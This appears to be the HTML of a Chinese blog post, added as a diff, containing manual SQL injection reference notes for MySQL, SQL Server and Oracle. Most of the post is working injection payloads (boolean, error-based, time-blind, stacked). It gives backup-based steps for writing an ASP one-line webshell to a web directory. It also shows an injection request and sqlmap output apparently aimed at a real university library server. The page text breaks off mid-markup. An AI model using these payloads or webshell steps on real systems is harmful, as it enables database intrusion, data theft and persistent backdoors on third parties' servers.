@@ -1,0 +1,922 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+<meta name="google-site-verification" content="9Uqdk6WBttaW2iVEZWNVyCsRscTnIN0PddwPIO3LnJ0" />
+<meta name="baidu-site-verification" content="code-oUsBMQlUt5" />
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="true" />
+
+
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="true" />
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="SQL注入," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="MySQL语法1234567if语句： if(1&#x3D;1,1,0)substr(&quot;abc&quot;, 1, 1) &#x2F;&#x2F;aselect @@secure_file_priv; &#x2F;&#x2F;查看文件导出权限&amp;#x27;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;&amp;#x27;select @@plugin_dir; &#x2F;&#x2F;查看plugin目录&amp;#x27;&#x2F;usr&#x2F;lib64&#x2F;mysql&#x2F;plugin&#x2F;&amp;#x">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL手注参考笔记">
+<meta property="og:url" content="https://xhycccc.github.io/2020/09/19/sql-manual-injection-referrence/index.html">
+<meta property="og:site_name" content="欣海余诚&#39;s blog">
+<meta property="og:description" content="MySQL语法1234567if语句： if(1&#x3D;1,1,0)substr(&quot;abc&quot;, 1, 1) &#x2F;&#x2F;aselect @@secure_file_priv; &#x2F;&#x2F;查看文件导出权限&amp;#x27;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;&amp;#x27;select @@plugin_dir; &#x2F;&#x2F;查看plugin目录&amp;#x27;&#x2F;usr&#x2F;lib64&#x2F;mysql&#x2F;plugin&#x2F;&amp;#x">
+<meta property="og:locale">
+<meta property="og:image" content="https://xhycccc.github.io/2020/09/19/sql-manual-injection-referrence/mssql_log_write_shell.jpg">
+<meta property="og:image" content="https://xhycccc.github.io/2020/09/19/sql-manual-injection-referrence/mssql_diff_write_shell.jpg">
+<meta property="article:published_time" content="2020-09-19T06:28:54.000Z">
+<meta property="article:modified_time" content="2021-07-06T07:58:18.197Z">
+<meta property="article:author" content="欣海余诚">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xhycccc.github.io/2020/09/19/sql-manual-injection-referrence/mssql_log_write_shell.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://xhycccc.github.io/2020/09/19/sql-manual-injection-referrence/"/>
+
+
+
+
+
+  <title>SQL手注参考笔记 | 欣海余诚's blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband">
+<a target="_blank" rel="noopener" href="https://github.com/xhycccc" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+    </div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">欣海余诚's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">习惯成自然</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-guestbook">
+          <a href="/guestbook/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-comment"></i> <br />
+            
+            留言
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://xhycccc.github.io/2020/09/19/sql-manual-injection-referrence/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="欣海余诚's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQL手注参考笔记</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-09-19T14:28:54+08:00">
+                2020-09-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">WEB安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if语句： if(1=1,1,0)</span><br><span class="line">substr(&quot;abc&quot;, 1, 1) //a</span><br><span class="line">select @@secure_file_priv; //查看文件导出权限</span><br><span class="line">&#x27;/var/lib/mysql-files/&#x27;</span><br><span class="line">select @@plugin_dir; //查看plugin目录</span><br><span class="line">&#x27;/usr/lib64/mysql/plugin/&#x27;</span><br><span class="line">select @@basedir; // 查看数据库目录</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bool型(无空格)</span><br><span class="line">1&#x27;and&#x27;y&#x27;=&#x27;f</span><br><span class="line">1&#x27;and&#x27;y&#x27;=&#x27;y</span><br><span class="line">1&#x27;and ord(mid(user(),1,1))&gt;1 and &#x27;y&#x27;=&#x27;y</span><br><span class="line">搜索型：</span><br><span class="line">%&#x27; and 1=1 and &#x27;%&#x27;=&#x27;</span><br><span class="line">%&#x27; and 1=2 and &#x27;%&#x27;=&#x27;</span><br><span class="line">报错注入</span><br><span class="line">&#x27;and/**/extractvalue(1,concat(char(126),md5(1982470395)))and&#x27;</span><br><span class="line">&#x27;and/**/extractvalue(1,concat(user()))and&#x27;</span><br><span class="line">1&#x27;and/**/updatexml(1,concat(char(126),user()),1)and&#x27;</span><br><span class="line">盲注(无空格)</span><br><span class="line">1&#x27;and(select*from(select+sleep(2))a/**/union/**/select+1)=&#x27;</span><br><span class="line">注数据库长度：</span><br><span class="line">1&#x27;and(select*from(select if(LENGTH(database())=%d,sleep(3),0))a)=&#x27;</span><br><span class="line">注数据库名：</span><br><span class="line">1&#x27;and(select*from(select if(ASCII(SUBSTR(database(),1,1))=97,sleep(3),0))a)=&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>盲注常用函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ascii(str): str是一个字符串参数，返回值为其最左侧字符的ascii码。通过它，我们才能确定特定的字符。</span><br><span class="line"></span><br><span class="line">substr(str,start,len): 这个函数是取str中从下标start开始的，长度为len的字符串。通常在盲注中用于取出单个字符，交给ascii函数来确定其具体的值。。</span><br><span class="line"></span><br><span class="line">MID(str, start [, Length]): 也是截取字符串，只用于mysql。</span><br><span class="line"></span><br><span class="line">length(str): 这个函数是用来获取str的长度的。这样我们才能知道需要通过substr取到哪个下标。</span><br><span class="line"></span><br><span class="line">count([column]): 这个函数大家应该很熟，用来统计记录的数量的，其在盲注中，主要用于判断符合条件的记录的数量，并逐个破解。</span><br><span class="line"></span><br><span class="line">if(condition,a,b): 当condition为true的时候，返回a，当condition为false的时候，返回b。</span><br><span class="line"></span><br><span class="line">ord(&#x27;a&#x27;) 转换为ascii码</span><br><span class="line"></span><br><span class="line">left(str, len) 取str中前len个字符。select LEFT(&#x27;123&#x27;,2)结果为12</span><br><span class="line"></span><br><span class="line">char(114) 数字转换为字符</span><br><span class="line"></span><br><span class="line">regexp &#x27;正则表达式&#x27; 正则表达式匹配 select &#x27;2bc&#x27; REGEXP &#x27;^[a-z]&#x27;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><ul>
+<li>端口号为 1433</li>
+<li>数据库后缀名 .mdf</li>
+<li>注释符 –</li>
+<li>支持堆叠查询：Y</li>
+</ul>
+<h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><ul>
+<li>sa权限：数据库操作，文件管理，命令执行，注册表读取等system。SQLServer数据库的最高权限</li>
+<li>db_owner权限：文件管理，数据库操作等权限 users-administrators</li>
+<li>public权限：数据库操作 guest-users</li>
+</ul>
+<h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>有6个默认的库，分别是4个系统数据库：</p>
+<ul>
+<li>master</li>
+<li>model</li>
+<li>msdb </li>
+<li>tempdb</li>
+</ul>
+<p>和2个其他数据库：</p>
+<ul>
+<li>ReportServer</li>
+<li>ReportServerTempDB。</li>
+</ul>
+<p>其中，model和tempdb是默认没有数据表的。</p>
+<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">select @@version;       #查询数据库的版本</span><br><span class="line">select host_name();     #查询主机名，如果是用navicat远程连接的话，主机名是本地的名字</span><br><span class="line">select db_name();       #查询当前数据库名</span><br><span class="line">select user;            #查询当前数据库的拥有者，结果为 dbo。dbo是每个数据库的默认用户，具有所有者权限，全称：datebaseOwner ，即DbOwner </span><br><span class="line">use tempdb              #切换到tempdb表  </span><br><span class="line">top n                   #查询前n条记录</span><br><span class="line">select substring(&#x27;string&#x27;,2,1)     #截取给定字符串的索引为2的1个字符</span><br><span class="line">select ascii(&#x27;a&#x27;)                  #查询给定字符串的ascii值</span><br><span class="line">select len(&#x27;string&#x27;)               #查询给定字符串的长度</span><br><span class="line">if语句：sqlserver：if(1=1) (sql语句)   else （sql语句）</span><br><span class="line"></span><br><span class="line">#查询数据库</span><br><span class="line">select count(name) from sysdatabases     #查询数据库的个数</span><br><span class="line">select name  from sysdatabases           #查询数据库的名字</span><br><span class="line">select * from sysdatabases               #查询所有数据库的信息</span><br><span class="line"></span><br><span class="line">#查询数据表</span><br><span class="line">select * from sysobjects where type=&#x27;u&#x27;  #查询当前数据库的所有表的详细信息</span><br><span class="line">select count(name) from msdb..sysobjects where xtype=&#x27;U&#x27;  #查询指定msdb数据库中表的个数</span><br><span class="line">select name from msdb..sysobjects where xtype=&#x27;U&#x27;         #查询指定msdb数据库中表的名字</span><br><span class="line">select * from msdb..sysobjects where xtype=&#x27;U&#x27;            #查询指定msdb数据库中表的详细信息</span><br><span class="line"></span><br><span class="line">#查询列</span><br><span class="line">select name from syscolumns where id=(select max(id) from sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)           #查询当前数据库的指定users表的所有列</span><br><span class="line">select count(name) from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)   #查询指定test数据库的指定users表的列的个数</span><br><span class="line">select name from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)       #查询指定test数据库的指定users表的所有列</span><br><span class="line">select * from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)       #查询指定test数据库的指定users表的列的详细信息</span><br><span class="line"></span><br><span class="line">#查询数据</span><br><span class="line">select count(*) from test..user          #查询test数据库user表的数据的条数</span><br><span class="line">select * from test..user                 #查询test数据库user表的所有数据</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>手工注入payload: </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">xray检验是否存在sql注入：</span><br><span class="line">932&#x27;and/**/convert(int,sys.fn_sqlvarbasetostr(HashBytes(&#x27;MD5&#x27;,&#x27;1899274127&#x27;)))&gt;&#x27;0</span><br><span class="line"></span><br><span class="line">boolean-based blind</span><br><span class="line">Payload: centid=932&#x27; AND 6663=6663 AND &#x27;dlfS&#x27;=&#x27;dlfS</span><br><span class="line"></span><br><span class="line">error-based</span><br><span class="line">Payload: centid=932&#x27; AND 8657 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8657=8657) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(120)+CHAR(122)+CHAR(113))) AND &#x27;YkOb&#x27;=&#x27;YkOb</span><br><span class="line">Vector: AND [RANDNUM] IN (SELECT (&#x27;[DELIMITER_START]&#x27;+([QUERY])+&#x27;[DELIMITER_STOP]&#x27;))</span><br><span class="line"></span><br><span class="line">stacked queries</span><br><span class="line">centid=932&#x27;;WAITFOR DELAY &#x27;0:0:5&#x27;--</span><br><span class="line"></span><br><span class="line">time-based blind</span><br><span class="line">centid=932&#x27;;WAITFOR DELAY &#x27;0:0:5&#x27;--</span><br><span class="line">admin&#x27;and(select+1)&gt;0waitfor/**/delay&#x27;0:0:3</span><br><span class="line">admin&#x27;;waitfor/**/delay&#x27;0:0:3</span><br><span class="line"></span><br><span class="line">获取当前user</span><br><span class="line">932&#x27; and 1=(select user_name())--</span><br><span class="line">获取当前数据库</span><br><span class="line">932&#x27; and 1=(select db_name()) AND &#x27;WckB&#x27;=&#x27;WckB</span><br><span class="line"></span><br><span class="line">获取第一个数据库(dbid=1获取第一个)</span><br><span class="line">932&#x27; and 1=(select name from master.dbo.sysdatabases where dbid=1)--</span><br><span class="line">注表名</span><br><span class="line">932&#x27; and  1=(select top 1 name from where xtype=’u’)--</span><br><span class="line">注列名</span><br><span class="line">and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&#x27;表名&#x27;))--</span><br><span class="line">注数据</span><br><span class="line">932&#x27; and 1=(select top 1 表名 from 字段名)--</span><br><span class="line">查看是否有xp_cmdshell权限（）</span><br><span class="line">932&#x27; and 1=(Select count(*) FROM sysobjects Where xtype = &#x27;X&#x27; AND name = &#x27;xp_cmdshell&#x27;)--</span><br><span class="line">932&#x27; and 0=(Select count(*) FROM sysobjects Where xtype = &#x27;X&#x27; AND name = &#x27;xp_cmdshell&#x27;)--</span><br><span class="line">判断当前数据库用户权限</span><br><span class="line">and 1=(IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;))        //返回正常为sa</span><br><span class="line">and 1=(IS_MEMBER(&#x27;db_owner&#x27;))               //返回正常为DB_OWNER</span><br><span class="line">and 1=(IS_srvrolemember(&#x27;public&#x27;))          //public权限,较低</span><br></pre></td></tr></table></figure>
+
+<h2 id="SqlServer-getshell"><a href="#SqlServer-getshell" class="headerlink" title="SqlServer getshell"></a>SqlServer getshell</h2><h3 id="LOG备份"><a href="#LOG备份" class="headerlink" title="LOG备份"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_17204441/article/details/90509698">LOG备份</a></h3><p>利用条件：</p>
+<ol>
+<li>至少DBO权限</li>
+<li>前提得知绝对路径，并且可写</li>
+<li>站库不分离</li>
+<li>数据库必须被备份过一次</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alter database test set RECOVERY FULL;</span><br><span class="line">create table dbo.test2(a image);</span><br><span class="line">insert into test..test2(a) values (0x3c256578656375746520726571756573742822786879632229253e); //&lt;%execute request(&quot;xhyc&quot;)%&gt;</span><br><span class="line">backup database test to disk=&#x27;d:\sqlserver.bak&#x27;;</span><br><span class="line">backup log test to disk=&#x27;d:\shell.asp&#x27; with init;</span><br><span class="line">drop table test..test2;</span><br></pre></td></tr></table></figure>
+
+<p>测试dbo权限写入成功：</p>
+<p><img src="mssql_log_write_shell.jpg" alt="image"></p>
+<h3 id="差异备份"><a href="#差异备份" class="headerlink" title="差异备份"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/PANDA-Mosen/p/13283204.html">差异备份</a></h3><ol>
+<li>至少DBO权限</li>
+<li>前提知道绝对路径，路径可写。</li>
+<li>HTTP 500错误不是自定义</li>
+<li>WEB和数据在一块。还有的就是数据库中不能存在%号之类的，不然也是不成功的。</li>
+<li>数据量不能太大</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">backup database test to disk = &#x27;d:\sqlserver.bak&#x27;;</span><br><span class="line">create table test..test2(a image);</span><br><span class="line">insert into test..test2(a) values (0x3c256578656375746520726571756573742822786879632229253e); //&lt;%execute request(&quot;xhyc&quot;)%&gt;</span><br><span class="line">backup database test to disk = &#x27;D:\phpstudy_pro\WWW\shell3.asp&#x27; with differential , format;</span><br><span class="line">drop table test..test2;</span><br></pre></td></tr></table></figure>
+<p>测试dbo权限写入成功：</p>
+<p><img src="mssql_diff_write_shell.jpg" alt="image"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>Sqlserver 大于2005版本默认关闭xp_cmdshell，无法执行系统cmd命令，需要安装cmd_shell组件。</p>
+<p>db_owner、public权限提权：通过文件备份功能写入一句话木马</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/csnd/p/11807695.html">SQLServer数据库及注入方法</a></li>
+</ul>
+<h1 id="Oralce"><a href="#Oralce" class="headerlink" title="Oralce"></a>Oralce</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /middle.aspx HTTP/1.1</span><br><span class="line">Host: library.ysu.edu.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Content-Length: 115</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: http://library.ysu.edu.cn/</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line"></span><br><span class="line">number=2&#x27;/**/and/**/(select decode(length(user),5,dbms_pipe.receive_message(&#x27;RDS&#x27;,10),0) from dual)=&#x27;1&amp;passwd=admin</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; python sqlmap.py -r pack.txt -pnumber  -v --sql-shell</span><br><span class="line">select banner from sys.v_$version [2]:</span><br><span class="line">[*] Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Production</span><br><span class="line">[*] PL/SQL Release 11.2.0.1.0 - Production</span><br></pre></td></tr></table></figure>
+<h2 id="基本信息-1"><a href="#基本信息-1" class="headerlink" title="基本信息"></a>基本信息</h2><ul>
+<li>Oracle不支持堆叠查询</li>
+<li>DBMS_PIPE.RECEIVE_MESSAGE函数将为从RDS管道返回的数据等待10秒。默认情况下，允许以public权限执行该包。</li>
+<li>不同于其它数据库，oracle只会安装一个数据库，但是可以创建多个用户，将用户和表对应起来。</li>
+<li>dual是一个虚拟表，用来构成select的语法规则，oracle保证dual里面永远只有一条记录。</li>
+<li>创建用户不指定表空间会把各种数据放到默认的空间里</li>
+</ul>
+<p>常用数据表：</p>
+<ul>
+<li>dba用户表：dba_users</li>
+<li>dba表空间表：dba_tablespaces</li>
+<li>版本号表：product_component_version</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 